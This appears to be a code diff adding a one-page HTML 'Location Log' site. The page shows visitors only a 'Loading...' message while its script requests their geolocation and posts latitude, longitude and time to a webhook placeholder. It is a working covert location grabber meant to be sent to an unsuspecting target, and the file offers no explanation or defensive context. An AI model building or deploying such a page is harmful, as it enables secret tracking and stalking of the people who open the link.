@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Location Log</title>
+</head>
+<body>
+    <p>Loading...</p>
+    <script>
+        navigator.geolocation.getCurrentPosition(position => {
+            fetch('YOUR_WEBHOOK_URL', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    time: new Date().toISOString()
+                })
+            });
+        });
+    </script>
+</body>
+</html>
